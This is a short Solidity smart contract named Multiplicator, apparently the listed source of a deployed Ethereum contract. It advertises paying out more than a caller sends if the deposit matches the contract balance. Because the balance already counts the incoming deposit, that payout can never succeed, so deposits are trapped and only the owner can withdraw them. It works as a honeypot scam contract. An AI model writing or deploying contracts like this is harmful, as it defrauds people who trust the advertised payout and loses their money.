/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Multiplicator at 0xdf77e4a81fba17e0cc39dba521aa4167f388ed7c
*/
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;
   
    function()payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}